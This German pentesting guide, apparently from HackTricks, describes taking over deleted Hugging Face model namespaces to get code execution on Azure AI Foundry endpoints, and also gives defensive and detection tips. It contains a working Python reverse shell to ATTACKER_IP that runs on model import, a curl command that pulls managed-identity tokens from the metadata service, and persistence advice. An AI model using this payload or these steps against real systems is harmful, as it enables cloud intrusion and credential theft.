# Azure - AI Foundry Post-Exploitation durch Wiederverwendung von Hugging Face Model-Namespaces

{{#include ../../../banners/hacktricks-training.md}}

## Szenario

- Der Azure AI Foundry Model Catalog enthält viele Hugging Face (HF) Modelle für One-Click-Bereitstellungen.
- HF model identifiers are Author/ModelName. Wenn ein HF author/org gelöscht wird, kann jeder diesen Author neu registrieren und ein Modell mit demselben ModelName am legacy path veröffentlichen.
- Pipelines und Kataloge, die nur nach Name pullen (kein commit pinning/integrity), werden auf vom Angreifer kontrollierte Repos aufgelöst. Wenn Azure das Modell deployed, kann Loader-Code in der Endpoint-Umgebung ausgeführt werden und RCE mit den Berechtigungen dieses Endpoints ermöglichen.

Häufige HF-Takeover-Fälle:
- Ownership deletion: Alter Pfad 404 bis zur Übernahme.
- Ownership transfer: Alter Pfad 307 zum neuen Author, solange der alte Author existiert. Wenn der alte Author später gelöscht und neu registriert wird, bricht die Weiterleitung und das Angreifer-Repo wird am Legacy-Pfad ausgeliefert.

## Identifying Reusable Namespaces (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## End-to-End-Angriffsablauf gegen Azure AI Foundry

1) Im Model Catalog HF-Modelle finden, deren ursprüngliche Autoren auf HF gelöscht oder übertragen wurden (alter Author entfernt).
2) Den verlassenen Author auf HF erneut registrieren und den ModelName neu erstellen.
3) Ein bösartiges repo veröffentlichen mit Loader-Code, der beim Import ausgeführt wird oder trust_remote_code=True erfordert.
4) Die legacy Author/ModelName in Azure AI Foundry deployen. Die Plattform zieht das Angreifer-repo; der Loader führt im Azure Endpoint-Container/VM aus und erzielt RCE mit den Berechtigungen des Endpunkts.

Beispielhaftes Payload-Fragment, das beim Import ausgeführt wird (nur zur Demonstration):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Hinweise
- AI Foundry-Deployments, die HF integrieren, klonen und importieren typischerweise Repo-Module, die in der Konfiguration des Modells referenziert werden (z. B. auto_map), was Codeausführung auslösen kann. Für einige Pfade ist trust_remote_code=True erforderlich.
- Der Zugriff entspricht in der Regel den Berechtigungen der managed identity/service principal des Endpunkts. Behandle ihn als Initial-Access-Foothold für Datenzugriff und laterale Bewegung innerhalb von Azure.

## Post-Exploitation Tipps (Azure Endpoint)

- Enumeriere Environment-Variablen und MSI-Endpunkte nach Tokens:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Überprüfe eingebundenen Speicher, Modellartefakte und erreichbare Azure-Dienste mit dem erlangten Token.
- Erwäge persistence, indem du vergiftete Modellartefakte hinterlässt, falls die Plattform Modelle erneut von HF abruft.

## Verteidigungshinweise für Azure AI Foundry-Nutzer

- Modelle beim Laden von HF nach Commit pinnen:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Spiegeln Sie geprüfte HF-Modelle in ein vertrauenswürdiges internes Registry und stellen Sie sie von dort bereit.
- Scannen Sie kontinuierlich Codebasen und defaults/docstrings/notebooks nach hartkodierten Author/ModelName, die gelöscht/übertragen wurden; aktualisieren oder pinnen.
- Validieren Sie die Existenz des author und die Provenienz des Modells vor der Bereitstellung.

## Erkennungsheuristiken (HTTP)

- Gelöschter author: author-Seite 404; legacy model path 404 bis zur Übernahme.
- Übertragenes Modell: legacy path 307 auf neuen author, während der alte author existiert; wenn der alte author später gelöscht und neu registriert wird, liefert der legacy path Angreifer-Inhalte.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Querverweise

- Siehe die umfassendere Methodik und Hinweise zur Lieferkette:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Referenzen

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
